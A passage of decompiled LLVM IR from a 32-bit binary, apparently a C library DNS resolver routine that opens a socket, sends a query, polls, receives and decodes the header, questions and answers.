dec_label_pc_805592b:                             ; preds = %dec_label_pc_80558f4, %dec_label_pc_805590b
  %v1_805592b = phi i32 [ %v1_8055928, %dec_label_pc_805590b ], [ %v0_8055915, %dec_label_pc_80558f4 ]
  %v0_805592b = load i32, i32* @ecx, align 4
  %v2_805592b = add i32 %v1_805592b, -4
  %v3_805592b = inttoptr i32 %v2_805592b to i32*
  store i32 %v0_805592b, i32* %v3_805592b, align 4
  %v1_805592c = add i32 %v1_805592b, -8
  %v2_805592c = inttoptr i32 %v1_805592c to i32*
  store i32 17, i32* %v2_805592c, align 4
  %v1_805592e = add i32 %v1_805592b, -12
  %v2_805592e = inttoptr i32 %v1_805592e to i32*
  store i32 2, i32* %v2_805592e, align 4
  %v1_8055930 = add i32 %v1_805592b, 156
  %v2_8055930 = inttoptr i32 %v1_8055930 to i16*
  %v3_8055930 = load i16, i16* %v2_8055930, align 2
  %v4_8055930 = zext i16 %v3_8055930 to i32
  store i32 %v4_8055930, i32* %eax.global-to-local, align 4
  %v2_8055938 = add i32 %v1_805592b, -16
  %v3_8055938 = inttoptr i32 %v2_8055938 to i32*
  store i32 %v4_8055930, i32* %v3_8055938, align 4
  %v4_8055939 = call i32 @socket(i32 -1, i32 %v15_805571c, i32 %v3_805577b)
  store i32 %v4_8055939, i32* %eax.global-to-local, align 4
  %v1_805593e = load i32, i32* @esp, align 4
  %v2_805593e = add i32 %v1_805593e, 36
  %v3_805593e = inttoptr i32 %v2_805593e to i32*
  store i32 %v4_8055939, i32* %v3_805593e, align 4
  %v0_8055942 = load i32, i32* @esp, align 4
  %v1_8055942 = add i32 %v0_8055942, 16
  %v0_8055945 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055945 = icmp slt i32 %v0_8055945, 0
  br i1 %v2_8055945, label %dec_label_pc_8055972, label %dec_label_pc_8055949

dec_label_pc_8055949:                             ; preds = %dec_label_pc_805592b
  %v1_8055949 = add i32 %v0_8055942, 172
  store i32 %v1_8055949, i32* %eax.global-to-local, align 4
  %v0_8055950 = load i32, i32* @edx, align 4
  %v2_8055950 = add i32 %v0_8055942, 12
  %v3_8055950 = inttoptr i32 %v2_8055950 to i32*
  store i32 %v0_8055950, i32* %v3_8055950, align 4
  %v1_8055951 = add i32 %v0_8055942, 8
  %v2_8055951 = inttoptr i32 %v1_8055951 to i32*
  store i32 28, i32* %v2_8055951, align 4
  %v0_8055953 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055953 = add i32 %v0_8055942, 4
  %v3_8055953 = inttoptr i32 %v2_8055953 to i32*
  store i32 %v0_8055953, i32* %v3_8055953, align 4
  %v1_8055954 = add i32 %v0_8055942, 36
  %v2_8055954 = inttoptr i32 %v1_8055954 to i32*
  %v3_8055954 = load i32, i32* %v2_8055954, align 4
  %v6_8055954 = inttoptr i32 %v0_8055942 to i32*
  store i32 %v3_8055954, i32* %v6_8055954, align 4
  %v4_8055958 = call i32 @__libc_connect(i32 -1, i32 %v15_805571c, i32 %v3_805577b)
  store i32 %v4_8055958, i32* %eax.global-to-local, align 4
  %v0_805595d = load i32, i32* @esp, align 4
  %v2_8055960 = icmp slt i32 %v4_8055958, 0
  %v1_8055962 = icmp eq i1 %v2_8055960, false
  br i1 %v1_8055962, label %dec_label_pc_805597b, label %dec_label_pc_8055964

dec_label_pc_8055964:                             ; preds = %dec_label_pc_8055949
  %v1_8055964 = call i32 @__errno_location(i32 -1)
  store i32 %v1_8055964, i32* %eax.global-to-local, align 4
  %v1_8055969 = inttoptr i32 %v1_8055964 to i32*
  %v2_8055969 = load i32, i32* %v1_8055969, align 4
  %v11_8055969 = icmp eq i32 %v2_8055969, 101
  %v0_8055cdb.pre = load i32, i32* @esp, align 4
  br i1 %v11_8055969, label %dec_label_pc_8055cdb, label %dec_label_pc_8055972

dec_label_pc_8055972:                             ; preds = %dec_label_pc_8055964, %dec_label_pc_805592b
  %v17_8055972 = phi i32 [ %v1_8055942, %dec_label_pc_805592b ], [ %v0_8055cdb.pre, %dec_label_pc_8055964 ]
  %v1_8055972 = add i32 %v17_8055972, 28
  %v2_8055972 = inttoptr i32 %v1_8055972 to i32*
  %v3_8055972 = load i32, i32* %v2_8055972, align 4
  %v4_8055972 = add i32 %v3_8055972, 1
  store i32 %v4_8055972, i32* %v2_8055972, align 4
  br label %dec_label_pc_8055cfc.backedge

dec_label_pc_805597b:                             ; preds = %dec_label_pc_8055949
  %v0_805597b = load i32, i32* @ebx, align 4
  %v1_805597b = load i32, i32* @esi, align 4
  %v2_805597b = add i32 %v1_805597b, %v0_805597b
  store i32 %v2_805597b, i32* %eax.global-to-local, align 4
  %v1_805597e = add i32 %v0_805595d, 12
  %v2_805597e = inttoptr i32 %v1_805597e to i32*
  store i32 0, i32* %v2_805597e, align 4
  %v0_8055980 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055980 = add i32 %v0_805595d, 8
  %v3_8055980 = inttoptr i32 %v2_8055980 to i32*
  store i32 %v0_8055980, i32* %v3_8055980, align 4
  %v2_8055981 = add i32 %v0_805595d, 4
  %v3_8055981 = inttoptr i32 %v2_8055981 to i32*
  store i32 %v2_805568e, i32* %v3_8055981, align 4
  %v1_8055982 = add i32 %v0_805595d, 36
  %v2_8055982 = inttoptr i32 %v1_8055982 to i32*
  %v3_8055982 = load i32, i32* %v2_8055982, align 4
  %v6_8055982 = inttoptr i32 %v0_805595d to i32*
  store i32 %v3_8055982, i32* %v6_8055982, align 4
  %v5_8055986 = call i32 @__libc_send(i32 -1, i32 %v15_805571c, i32 %v3_805577b, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8055986, i32* %eax.global-to-local, align 4
  %v0_805598b = load i32, i32* @esp, align 4
  %v1_805598b = add i32 %v0_805598b, 36
  %v2_805598b = inttoptr i32 %v1_805598b to i32*
  %v3_805598b = load i32, i32* %v2_805598b, align 4
  %v2_805598f = add i32 %v0_805598b, 228
  %v3_805598f = inttoptr i32 %v2_805598f to i32*
  store i32 %v3_805598b, i32* %v3_805598f, align 4
  %v0_8055996 = load i32, i32* @esp, align 4
  %v1_8055996 = add i32 %v0_8055996, 232
  %v2_8055996 = inttoptr i32 %v1_8055996 to i16*
  store i16 1, i16* %v2_8055996, align 2
  %v0_80559a0 = load i32, i32* @esp, align 4
  %v1_80559a3 = add i32 %v0_80559a0, 8
  %v2_80559a3 = inttoptr i32 %v1_80559a3 to i32*
  store i32 10000, i32* %v2_80559a3, align 4
  %v1_80559a8 = add i32 %v0_80559a0, 4
  %v2_80559a8 = inttoptr i32 %v1_80559a8 to i32*
  store i32 1, i32* %v2_80559a8, align 4
  %v1_80559aa = add i32 %v0_80559a0, 228
  store i32 %v1_80559aa, i32* %eax.global-to-local, align 4
  %v3_80559b1 = inttoptr i32 %v0_80559a0 to i32*
  store i32 %v1_80559aa, i32* %v3_80559b1, align 4
  %v0_80559b2 = call i32 @__libc_poll()
  store i32 %v0_80559b2, i32* %eax.global-to-local, align 4
  %v0_80559b7 = load i32, i32* @esp, align 4
  %v1_80559b7 = add i32 %v0_80559b7, 16
  %tmp48 = icmp slt i32 %v0_80559b2, 1
  br i1 %tmp48, label %dec_label_pc_8055cdb, label %dec_label_pc_80559c2

dec_label_pc_80559c2:                             ; preds = %dec_label_pc_805597b
  %v1_80559c2 = add i32 %v0_80559b7, 12
  %v2_80559c2 = inttoptr i32 %v1_80559c2 to i32*
  store i32 0, i32* %v2_80559c2, align 4
  %v1_80559c4 = add i32 %v0_80559b7, 8
  %v2_80559c4 = inttoptr i32 %v1_80559c4 to i32*
  store i32 512, i32* %v2_80559c4, align 4
  %v2_80559c9 = add i32 %v0_80559b7, 4
  %v3_80559c9 = inttoptr i32 %v2_80559c9 to i32*
  store i32 %v2_805568e, i32* %v3_80559c9, align 4
  %v1_80559ca = add i32 %v0_80559b7, 36
  %v2_80559ca = inttoptr i32 %v1_80559ca to i32*
  %v3_80559ca = load i32, i32* %v2_80559ca, align 4
  %v6_80559ca = inttoptr i32 %v0_80559b7 to i32*
  store i32 %v3_80559ca, i32* %v6_80559ca, align 4
  %v5_80559ce = call i32 @__libc_recv(i32 -1, i32 %v15_805571c, i32 %v3_805577b, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_80559ce, i32* @eax, align 4
  %v1_80559d3 = load i32, i32* @esp, align 4
  %v2_80559d3 = add i32 %v1_80559d3, 32
  %v3_80559d3 = inttoptr i32 %v2_80559d3 to i32*
  store i32 %v5_80559ce, i32* %v3_80559d3, align 4
  %v0_80559d7 = load i32, i32* @esp, align 4
  %v1_80559d7 = add i32 %v0_80559d7, 16
  %v7_80559dd = icmp sgt i32 %v5_80559ce, 11
  br i1 %v7_80559dd, label %dec_label_pc_80559e3, label %dec_label_pc_8055c90

dec_label_pc_80559e3:                             ; preds = %dec_label_pc_80559c2
  %v0_80559e3 = load i32, i32* @ebx, align 4
  %v2_80559e3 = add i32 %v0_80559d7, 12
  %v3_80559e3 = inttoptr i32 %v2_80559e3 to i32*
  store i32 %v0_80559e3, i32* %v3_80559e3, align 4
  %v0_80559e4 = load i32, i32* @ebx, align 4
  %v2_80559e4 = add i32 %v0_80559d7, 8
  %v3_80559e4 = inttoptr i32 %v2_80559e4 to i32*
  store i32 %v0_80559e4, i32* %v3_80559e4, align 4
  %v1_80559e5 = add i32 %v0_80559d7, 84
  store i32 %v1_80559e5, i32* %eax.global-to-local, align 4
  %v2_80559e9 = add i32 %v0_80559d7, 4
  %v3_80559e9 = inttoptr i32 %v2_80559e9 to i32*
  store i32 %v1_80559e5, i32* %v3_80559e9, align 4
  %v3_80559ea = inttoptr i32 %v0_80559d7 to i32*
  store i32 %v2_805568e, i32* %v3_80559ea, align 4
  %v0_80559eb = call i32 @__decode_header()
  store i32 %v0_80559eb, i32* %eax.global-to-local, align 4
  %v0_80559f0 = load i32, i32* @esp, align 4
  %v1_80559f0 = add i32 %v0_80559f0, 84
  %v2_80559f0 = inttoptr i32 %v1_80559f0 to i32*
  %v3_80559f0 = load i32, i32* %v2_80559f0, align 4
  store i32 %v3_80559f0, i32* %edx.global-to-local, align 4
  %v2_80559f4 = add i32 %v0_80559f0, 72
  %v3_80559f4 = inttoptr i32 %v2_80559f4 to i32*
  store i32 %v3_80559f0, i32* %v3_80559f4, align 4
  %v0_80559f8 = load i32, i32* @esp, align 4
  %v1_80559f8 = add i32 %v0_80559f8, 16
  %v1_80559fb = add i32 %v0_80559f8, 60
  %v2_80559fb = inttoptr i32 %v1_80559fb to i32*
  %v3_80559fb = load i32, i32* %v2_80559fb, align 4
  store i32 %v3_80559fb, i32* @eax, align 4
  %v0_80559ff = load i32, i32* %edx.global-to-local, align 4
  %v12_80559ff = icmp eq i32 %v0_80559ff, %v3_80559fb
  %v1_8055a01 = icmp eq i1 %v12_80559ff, false
  br i1 %v1_8055a01, label %dec_label_pc_8055c90, label %dec_label_pc_8055a07

dec_label_pc_8055a07:                             ; preds = %dec_label_pc_80559e3
  %v1_8055a07 = add i32 %v0_80559f8, 88
  %v2_8055a07 = inttoptr i32 %v1_8055a07 to i32*
  %v3_8055a07 = load i32, i32* %v2_8055a07, align 4
  %v4_8055a07 = icmp eq i32 %v3_8055a07, 0
  br i1 %v4_8055a07, label %dec_label_pc_8055c90, label %dec_label_pc_8055a12

dec_label_pc_8055a12:                             ; preds = %dec_label_pc_8055a07
  %v1_8055a12 = add i32 %v0_80559f8, 112
  %v2_8055a12 = inttoptr i32 %v1_8055a12 to i32*
  %v3_8055a12 = load i32, i32* %v2_8055a12, align 4
  store i32 %v3_8055a12, i32* @eax, align 4
  %v9_8055a16 = icmp eq i32 %v3_8055a12, 3
  %v1_8055a19 = icmp eq i1 %v9_8055a16, false
  br i1 %v1_8055a19, label %dec_label_pc_8055a81, label %dec_label_pc_8055a1b

dec_label_pc_8055a1b:                             ; preds = %dec_label_pc_8055a12
  %v1_8055a1b = add i32 %v0_80559f8, 67
  %v2_8055a1b = inttoptr i32 %v1_8055a1b to i8*
  %v3_8055a1b = load i8, i8* %v2_8055a1b, align 1
  %v4_8055a1b = icmp eq i8 %v3_8055a1b, 0
  %v1_8055a20 = icmp eq i1 %v4_8055a1b, false
  br i1 %v1_8055a20, label %dec_label_pc_8055a71, label %dec_label_pc_8055a22

dec_label_pc_8055a22:                             ; preds = %dec_label_pc_8055a1b
  %v0_8055a22 = load i32, i32* @ecx, align 4
  %v2_8055a22 = add i32 %v0_80559f8, 12
  %v3_8055a22 = inttoptr i32 %v2_8055a22 to i32*
  store i32 %v0_8055a22, i32* %v3_8055a22, align 4
  %v1_8055a23 = add i32 %v0_80559f8, 8
  %v2_8055a23 = inttoptr i32 %v1_8055a23 to i32*
  store i32 ptrtoint (i32* @global_var_805b508.489 to i32), i32* %v2_8055a23, align 4
  %v1_8055a28 = add i32 %v0_80559f8, 4
  %v2_8055a28 = inttoptr i32 %v1_8055a28 to i32*
  store i32 134562611, i32* %v2_8055a28, align 4
  %v1_8055a2d = add i32 %v0_80559f8, 200
  store i32 %v1_8055a2d, i32* @esi, align 4
  %v3_8055a34 = inttoptr i32 %v0_80559f8 to i32*
  store i32 %v1_8055a2d, i32* %v3_8055a34, align 4
  %v2_8055a35 = call i32 @__pthread_return_void(i32 -1, i32 %v15_805571c)
  store i32 %v2_8055a35, i32* %eax.global-to-local, align 4
  %v0_8055a3a = load i32, i32* @esp, align 4
  %v1_8055a3a = inttoptr i32 %v0_8055a3a to i32*
  store i32 ptrtoint (i32* @global_var_805b508.489 to i32), i32* %v1_8055a3a, align 4
  %v1_8055a41 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8055a41, i32* %eax.global-to-local, align 4
  %v0_8055a46 = load i32, i32* @esp, align 4
  %v1_8055a46 = inttoptr i32 %v0_8055a46 to i32*
  %v2_8055a46 = load i32, i32* %v1_8055a46, align 4
  store i32 %v2_8055a46, i32* @eax, align 4
  %v3_8055a46 = add i32 %v0_8055a46, 4
  %v1_8055a47 = inttoptr i32 %v3_8055a46 to i32*
  %v2_8055a47 = load i32, i32* %v1_8055a47, align 4
  store i32 %v2_8055a47, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8055a47, align 4
  %v0_8055a4a = load i32, i32* @esi, align 4
  store i32 %v0_8055a4a, i32* %v1_8055a46, align 4
  %v0_8055a4b = load i32, i32* @global_var_8061bf8.553, align 8
  store i32 %v0_8055a4b, i32* %ebx.global-to-local, align 4
  %v2_8055a51 = call i32 @__pthread_return_void(i32 -1, i32 %v15_805571c)
  store i32 %v2_8055a51, i32* %eax.global-to-local, align 4
  %v0_8055a56 = load i32, i32* @esp, align 4
  %v1_8055a59 = add i32 %v0_8055a4b, -1
  store i32 %v1_8055a59, i32* @ebx, align 4
  %v1_8055a5a = add i32 %v0_8055a56, 52
  %v2_8055a5a = inttoptr i32 %v1_8055a5a to i32*
  %v3_8055a5a = load i32, i32* %v2_8055a5a, align 4
  %v5_8055a5a = sub i32 %v3_8055a5a, %v1_8055a59
  %v11_8055a5a = xor i32 %v3_8055a5a, %v1_8055a59
  %v12_8055a5a = xor i32 %v5_8055a5a, %v3_8055a5a
  %v13_8055a5a = and i32 %v12_8055a5a, %v11_8055a5a
  %v14_8055a5a = icmp slt i32 %v13_8055a5a, 0
  %v16_8055a5a = icmp slt i32 %v5_8055a5a, 0
  %v2_8055a5e = icmp eq i1 %v16_8055a5a, %v14_8055a5a
  br i1 %v2_8055a5e, label %dec_label_pc_8055a71, label %dec_label_pc_8055a60

dec_label_pc_8055a60:                             ; preds = %dec_label_pc_8055a22
  %v4_8055a60 = add i32 %v3_8055a5a, 1
  store i32 %v4_8055a60, i32* %v2_8055a5a, align 4
  %v0_8055a64 = load i32, i32* @esp, align 4
  %v1_8055a64 = add i32 %v0_8055a64, 56
  %v2_8055a64 = inttoptr i32 %v1_8055a64 to i32*
  %v3_8055a64 = load i32, i32* %v2_8055a64, align 4
  store i32 %v3_8055a64, i32* %edx.global-to-local, align 4
  %v2_8055a68 = add i32 %v0_8055a64, 44
  %v3_8055a68 = inttoptr i32 %v2_8055a68 to i32*
  store i32 %v3_8055a64, i32* %v3_8055a68, align 4
  br label %dec_label_pc_8055cfc.backedge

dec_label_pc_8055a71:                             ; preds = %dec_label_pc_8055a22, %dec_label_pc_8055a1b
  %v0_8055a71 = call i32 @__GI___h_errno_location()
  store i32 %v0_8055a71, i32* %eax.global-to-local, align 4
  %v1_8055a76 = inttoptr i32 %v0_8055a71 to i32*
  store i32 1, i32* %v1_8055a76, align 4
  br label %dec_label_pc_8055d34

dec_label_pc_8055a81:                             ; preds = %dec_label_pc_8055a12
  %v1_8055a81 = icmp eq i32 %v3_8055a12, 0
  %v1_8055a83 = icmp eq i1 %v1_8055a81, false
  br i1 %v1_8055a83, label %dec_label_pc_8055c90, label %dec_label_pc_8055a89

dec_label_pc_8055a89:                             ; preds = %dec_label_pc_8055a81
  %v1_8055a89 = add i32 %v0_80559f8, 120
  %v2_8055a89 = inttoptr i32 %v1_8055a89 to i32*
  %v3_8055a89 = load i32, i32* %v2_8055a89, align 4
  %tmp49 = icmp slt i32 %v3_8055a89, 1
  br i1 %tmp49, label %dec_label_pc_8055a99, label %dec_label_pc_8055a90

dec_label_pc_8055a90:                             ; preds = %dec_label_pc_8055a89
  store i32 0, i32* @ebx, align 4
  store i32 12, i32* @esi, align 4
  %v2_8055ab855 = add i32 %v0_80559f8, 116
  %v3_8055ab856 = inttoptr i32 %v2_8055ab855 to i32*
  %v4_8055ab857 = load i32, i32* %v3_8055ab856, align 4
  %v5_8055ab858 = sub i32 0, %v4_8055ab857
  %v13_8055ab862 = and i32 %v4_8055ab857, %v5_8055ab858
  %v14_8055ab863 = icmp slt i32 %v13_8055ab862, 0
  %v16_8055ab865 = icmp slt i32 %v5_8055ab858, 0
  %v2_8055abc66 = icmp eq i1 %v16_8055ab865, %v14_8055ab863
  br i1 %v2_8055abc66, label %dec_label_pc_8055abe, label %dec_label_pc_8055aa9

dec_label_pc_8055a99:                             ; preds = %dec_label_pc_8055a89
  %v0_8055a99 = call i32 @__GI___h_errno_location()
  store i32 %v0_8055a99, i32* %eax.global-to-local, align 4
  %v1_8055a9e = inttoptr i32 %v0_8055a99 to i32*
  store i32 4, i32* %v1_8055a9e, align 4
  br label %dec_label_pc_8055d34

dec_label_pc_8055aa9:                             ; preds = %dec_label_pc_8055a90, %dec_label_pc_8055aa9
  %v0_8055ac068 = phi i32 [ %v1_8055ab5, %dec_label_pc_8055aa9 ], [ %v1_80559f8, %dec_label_pc_8055a90 ]
  %v0_8055aa967 = phi i32 [ %v0_8055aad, %dec_label_pc_8055aa9 ], [ %v3_8055a12, %dec_label_pc_8055a90 ]
  %v2_8055aa9 = add i32 %v0_8055ac068, -4
  %v3_8055aa9 = inttoptr i32 %v2_8055aa9 to i32*
  store i32 %v0_8055aa967, i32* %v3_8055aa9, align 4
  %v0_8055aaa = load i32, i32* @eax, align 4
  %v2_8055aaa = add i32 %v0_8055ac068, -8
  %v3_8055aaa = inttoptr i32 %v2_8055aaa to i32*
  store i32 %v0_8055aaa, i32* %v3_8055aaa, align 4
  %v0_8055aab = load i32, i32* @esi, align 4
  %v2_8055aab = add i32 %v0_8055ac068, -12
  %v3_8055aab = inttoptr i32 %v2_8055aab to i32*
  store i32 %v0_8055aab, i32* %v3_8055aab, align 4
  %v2_8055aac = add i32 %v0_8055ac068, -16
  %v3_8055aac = inttoptr i32 %v2_8055aac to i32*
  store i32 %v2_805568e, i32* %v3_8055aac, align 4
  %v0_8055aad = call i32 @__length_question()
  store i32 %v0_8055aad, i32* @eax, align 4
  %v0_8055ab2 = load i32, i32* @ebx, align 4
  %v1_8055ab2 = add i32 %v0_8055ab2, 1
  store i32 %v1_8055ab2, i32* @ebx, align 4
  %v0_8055ab3 = load i32, i32* @esi, align 4
  %v2_8055ab3 = add i32 %v0_8055ab3, %v0_8055aad
  store i32 %v2_8055ab3, i32* @esi, align 4
  %v0_8055ab5 = load i32, i32* @esp, align 4
  %v1_8055ab5 = add i32 %v0_8055ab5, 16
  %v2_8055ab8 = add i32 %v0_8055ab5, 116
  %v3_8055ab8 = inttoptr i32 %v2_8055ab8 to i32*
  %v4_8055ab8 = load i32, i32* %v3_8055ab8, align 4
  %v5_8055ab8 = sub i32 %v1_8055ab2, %v4_8055ab8
  %v11_8055ab8 = xor i32 %v4_8055ab8, %v1_8055ab2
  %v12_8055ab8 = xor i32 %v5_8055ab8, %v1_8055ab2
  %v13_8055ab8 = and i32 %v12_8055ab8, %v11_8055ab8
  %v14_8055ab8 = icmp slt i32 %v13_8055ab8, 0
  %v16_8055ab8 = icmp slt i32 %v5_8055ab8, 0
  %v2_8055abc = icmp eq i1 %v16_8055ab8, %v14_8055ab8
  br i1 %v2_8055abc, label %dec_label_pc_8055abe, label %dec_label_pc_8055aa9

dec_label_pc_8055abe:                             ; preds = %dec_label_pc_8055aa9, %dec_label_pc_8055a90
  %v0_8055ac0.lcssa = phi i32 [ %v1_80559f8, %dec_label_pc_8055a90 ], [ %v1_8055ab5, %dec_label_pc_8055aa9 ]
  store i32 0, i32* @ebx, align 4
  %v1_8055ac0 = add i32 %v0_8055ac0.lcssa, 27
  %v2_8055ac0 = inttoptr i32 %v1_8055ac0 to i8*
  store i8 1, i8* %v2_8055ac0, align 1
  %v0_8055bee.pre = load i32, i32* @ebx, align 4
  %v1_8055bee.pre = load i32, i32* @esp, align 4
  %v2_8055bee69 = add i32 %v1_8055bee.pre, 104
  %v3_8055bee70 = inttoptr i32 %v2_8055bee69 to i32*
  %v4_8055bee71 = load i32, i32* %v3_8055bee70, align 4
  %v5_8055bee72 = sub i32 %v0_8055bee.pre, %v4_8055bee71
  %v11_8055bee74 = xor i32 %v4_8055bee71, %v0_8055bee.pre
  %v12_8055bee75 = xor i32 %v5_8055bee72, %v0_8055bee.pre
  %v13_8055bee76 = and i32 %v12_8055bee75, %v11_8055bee74
  %v14_8055bee77 = icmp slt i32 %v13_8055bee76, 0
  %v16_8055bee79 = icmp slt i32 %v5_8055bee72, 0
  %v2_8055bf280 = icmp eq i1 %v16_8055bee79, %v14_8055bee77
  br i1 %v2_8055bf280, label %dec_label_pc_8055bfe, label %dec_label_pc_8055bf4.lr.ph

dec_label_pc_8055bf4.lr.ph:                       ; preds = %dec_label_pc_8055abe
  %v0_8055bf4.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8055bf4

dec_label_pc_8055aca:                             ; preds = %dec_label_pc_8055bf4
  %v1_8055aca = add i32 %v0_8055aca81, 116
  store i32 %v1_8055aca, i32* %eax.global-to-local, align 4
  %v2_8055ace = add i32 %v0_8055aca81, -4
  %v3_8055ace = inttoptr i32 %v2_8055ace to i32*
  store i32 %v1_8055aca, i32* %v3_8055ace, align 4
  %v3_8055acf = load i32, i32* %v3_8055bf4, align 4
  %v5_8055acf = add i32 %v0_8055aca81, -8
  %v6_8055acf = inttoptr i32 %v5_8055acf to i32*
  store i32 %v3_8055acf, i32* %v6_8055acf, align 4
  %v0_8055ad3 = load i32, i32* @esi, align 4
  %v2_8055ad3 = add i32 %v0_8055aca81, -12
  %v3_8055ad3 = inttoptr i32 %v2_8055ad3 to i32*
  store i32 %v0_8055ad3, i32* %v3_8055ad3, align 4
  %v2_8055ad4 = add i32 %v0_8055aca81, -16
  %v3_8055ad4 = inttoptr i32 %v2_8055ad4 to i32*
  store i32 %v2_805568e, i32* %v3_8055ad4, align 4
  %v0_8055ad5 = call i32 @__decode_answer()
  store i32 %v0_8055ad5, i32* @eax, align 4
  %v1_8055ada = load i32, i32* @esp, align 4
  %v2_8055ada = add i32 %v1_8055ada, 68
  %v3_8055ada = inttoptr i32 %v2_8055ada to i32*
  store i32 %v0_8055ad5, i32* %v3_8055ada, align 4
  %v0_8055ade = load i32, i32* @esp, align 4
  %v1_8055ade = add i32 %v0_8055ade, 16
  %v2_8055ae1 = icmp slt i32 %v0_8055ad5, 0
  %v1_8055ae3 = icmp eq i1 %v2_8055ae1, false
  br i1 %v1_8055ae3, label %dec_label_pc_8055afd, label %dec_label_pc_8055ae5

dec_label_pc_8055ae5:                             ; preds = %dec_label_pc_8055aca
  %v0_8055ae5 = load i32, i32* @ebx, align 4
  %v1_8055ae5 = icmp eq i32 %v0_8055ae5, 0
  br i1 %v1_8055ae5, label %dec_label_pc_8055c90, label %dec_label_pc_8055aed

dec_label_pc_8055aed:                             ; preds = %dec_label_pc_8055ae5
  %v1_8055aed = add i32 %v0_8055ade, 100
  %v2_8055aed = inttoptr i32 %v1_8055aed to i32*
  %v3_8055aed = load i32, i32* %v2_8055aed, align 4
  %v4_8055aed = icmp eq i32 %v3_8055aed, 0
  br i1 %v4_8055aed, label %dec_label_pc_8055c90, label %dec_label_pc_8055bfe

dec_label_pc_8055afd:                             ; preds = %dec_label_pc_8055aca
  %v1_8055afd = add i32 %v0_8055ade, 43
  %v2_8055afd = inttoptr i32 %v1_8055afd to i8*
  %v3_8055afd = load i8, i8* %v2_8055afd, align 1
  %v4_8055afd = icmp eq i8 %v3_8055afd, 0
  br i1 %v4_8055afd, label %dec_label_pc_8055b9e, label %dec_label_pc_8055b08

dec_label_pc_8055b08:                             ; preds = %dec_label_pc_8055afd
  %v0_8055b08 = load i32, i32* @edi, align 4
  %v1_8055b08 = add i32 %v0_8055b08, 28
  %v2_8055b08 = inttoptr i32 %v1_8055b08 to i32*
  %v3_8055b08 = load i32, i32* %v2_8055b08, align 4
  store i32 %v3_8055b08, i32* %eax.global-to-local, align 4
  %v2_8055b0b = add i32 %v0_8055ade, 160
  %v3_8055b0b = inttoptr i32 %v2_8055b0b to i32*
  store i32 %v3_8055b08, i32* %v3_8055b0b, align 4
  %v0_8055b12 = load i32, i32* @edi, align 4
  %v1_8055b12 = add i32 %v0_8055b12, 32
  %v2_8055b12 = inttoptr i32 %v1_8055b12 to i32*
  %v3_8055b12 = load i32, i32* %v2_8055b12, align 4
  store i32 %v3_8055b12, i32* %eax.global-to-local, align 4
  %v1_8055b15 = load i32, i32* @esp, align 4
  %v2_8055b15 = add i32 %v1_8055b15, 148
  %v3_8055b15 = inttoptr i32 %v2_8055b15 to i32*
  store i32 %v3_8055b12, i32* %v3_8055b15, align 4
  %v0_8055b1c = load i32, i32* @edi, align 4
  %v1_8055b1c = add i32 %v0_8055b1c, 36
  %v2_8055b1c = inttoptr i32 %v1_8055b1c to i32*
  %v3_8055b1c = load i32, i32* %v2_8055b1c, align 4
  store i32 %v3_8055b1c, i32* %eax.global-to-local, align 4
  %v1_8055b1f = load i32, i32* @esp, align 4
  %v2_8055b1f = add i32 %v1_8055b1f, 152
  %v3_8055b1f = inttoptr i32 %v2_8055b1f to i32*
  store i32 %v3_8055b1c, i32* %v3_8055b1f, align 4
  %v0_8055b26 = load i32, i32* @ecx, align 4
  %v1_8055b26 = load i32, i32* @esp, align 4
  %v2_8055b26 = add i32 %v1_8055b26, -4
  %v3_8055b26 = inttoptr i32 %v2_8055b26 to i32*
  store i32 %v0_8055b26, i32* %v3_8055b26, align 4
  %v1_8055b27 = add i32 %v1_8055b26, -8
  %v2_8055b27 = inttoptr i32 %v1_8055b27 to i32*
  store i32 40, i32* %v2_8055b27, align 4
  %v1_8055b29 = add i32 %v1_8055b26, 116
  store i32 %v1_8055b29, i32* %edx.global-to-local, align 4
  %v2_8055b2d = add i32 %v1_8055b26, -12
  %v3_8055b2d = inttoptr i32 %v2_8055b2d to i32*
  store i32 %v1_8055b29, i32* %v3_8055b2d, align 4
  %v0_8055b2e = load i32, i32* @edi, align 4
  %v2_8055b2e = add i32 %v1_8055b26, -16
  %v3_8055b2e = inttoptr i32 %v2_8055b2e to i32*
  store i32 %v0_8055b2e, i32* %v3_8055b2e, align 4
  %v5_8055b2f = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_805571c, i32 %v3_805577b)
  store i32 %v5_8055b2f, i32* %eax.global-to-local, align 4
  %v0_8055b34 = load i32, i32* @edi, align 4
  %v1_8055b34 = add i32 %v0_8055b34, 4
  %v2_8055b34 = inttoptr i32 %v1_8055b34 to i32*
  %v3_8055b34 = load i32, i32* %v2_8055b34, align 4
  store i32 %v3_8055b34, i32* %eax.global-to-local, align 4
  %v0_8055b37 = load i32, i32* @esp, align 4
  %v1_8055b37 = add i32 %v0_8055b37, 16
  %v9_8055b3a = icmp eq i32 %v3_8055b34, 24
  br i1 %v9_8055b3a, label %dec_label_pc_8055b08.dec_label_pc_8055b61_crit_edge, label %dec_label_pc_8055b3f

dec_label_pc_8055b08.dec_label_pc_8055b61_crit_edge: ; preds = %dec_label_pc_8055b08
  %.pre24 = add i32 %v0_8055b37, 260
  %.pre25 = inttoptr i32 %.pre24 to i32*
  %v4_8055b61.pre = load i32, i32* %.pre25, align 4
  br label %dec_label_pc_8055b61

dec_label_pc_8055b3f:                             ; preds = %dec_label_pc_8055b08
  %v1_8055b3f = add i32 %v0_8055b34, 28
  %v2_8055b3f = inttoptr i32 %v1_8055b3f to i32*
  %v3_8055b3f = load i32, i32* %v2_8055b3f, align 4
  %v4_8055b3f = icmp eq i32 %v3_8055b3f, 0
  br i1 %v4_8055b3f, label %dec_label_pc_8055bfe, label %dec_label_pc_8055b49

dec_label_pc_8055b49:                             ; preds = %dec_label_pc_8055b3f
  %v1_8055b49 = add i32 %v0_8055b37, 260
  %v2_8055b49 = inttoptr i32 %v1_8055b49 to i32*
  %v3_8055b49 = load i32, i32* %v2_8055b49, align 4
  %v12_8055b49 = icmp eq i32 %v3_8055b49, 1
  br i1 %v12_8055b49, label %dec_label_pc_8055b61, label %dec_label_pc_8055b53

dec_label_pc_8055b53:                             ; preds = %dec_label_pc_8055b49
  %v12_8055b53 = icmp eq i32 %v3_8055b49, 28
